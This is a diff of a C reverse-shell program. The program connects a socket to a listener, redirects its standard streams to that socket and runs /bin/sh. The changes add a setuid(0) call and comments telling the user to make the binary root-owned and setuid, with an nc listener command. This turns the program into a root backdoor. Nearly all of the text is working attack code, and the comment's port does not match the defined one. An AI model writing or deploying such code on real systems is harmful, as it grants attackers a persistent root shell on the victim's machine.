@@ -7,7 +7,10 @@
 
 #define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 12345
-//nc -v -l 127.0.0.1 12345 to test then whoami
+// sudo chown root:root shell 
+//sudo chmod 4711 shell
+// nc -v -l 127.0.0.1 1234
+
 
 int main(int argc, char *argv[])
 {
@@ -22,8 +25,8 @@ int main(int argc, char *argv[])
     connect(s, (struct sockaddr *)&sa, sizeof(sa));
     dup2(s, 0);
     dup2(s, 1);
-    dup2(s, 2);
-
+    dup2(s, 2); 
+	setuid(0);
     execve("/bin/sh", 0, 0);
     return 0;
 }
